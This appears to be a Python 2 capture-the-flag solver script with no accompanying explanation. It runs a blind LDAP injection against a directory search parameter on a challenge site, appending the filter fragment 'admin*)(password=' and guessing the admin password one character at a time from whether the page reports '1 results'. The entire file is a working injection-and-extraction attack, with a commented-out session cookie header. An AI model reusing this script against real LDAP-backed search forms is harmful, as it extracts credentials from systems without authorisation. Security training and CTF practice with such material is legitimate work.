#!/usr/bin/python
from stripogram import *
import urllib2
import os

dic = '0123456789abcdefghijklmnopqrstuvwxyz'

opener = urllib2.build_opener()
#opener.addheaders.append(('Cookie', 'PHPSESSID=q5ivj26apcvbb4hv8oe3leuaa5'))

enable = []
passwd = []
count = 0
url_tmp = 'http://challenge-url.com/?action=dir&search=admin*%29%28password%3D'

for x in xrange(0,32):
	count += 1
	print "First loop (x):" + str(x)
	for i in xrange(0,len(dic)):
		print "Second loop (i):" + str(i)
		#os.system("clear")
		enable.append(dic[i])
		print "Enable:"
		print enable
		injection = ''.join(enable)
		#print "Injection:"
		#print injection
		url = url_tmp + dic[i]
		print url
		print "[+] Injection : " + " %s" %injection
		f = opener.open(url).read()

		try:
			text = html2text(f).split("\n")[12]#.split(" ")[-1]
			print text
		except:
			print "Flag is : " + injection

		if text == '1 results':
			passwd.append(enable[0])
			url_tmp = url_tmp + dic[i]
			break
		else:
			try:
				del enable[x]
			except:
				print "Flag is: " + str(passwd)
				break
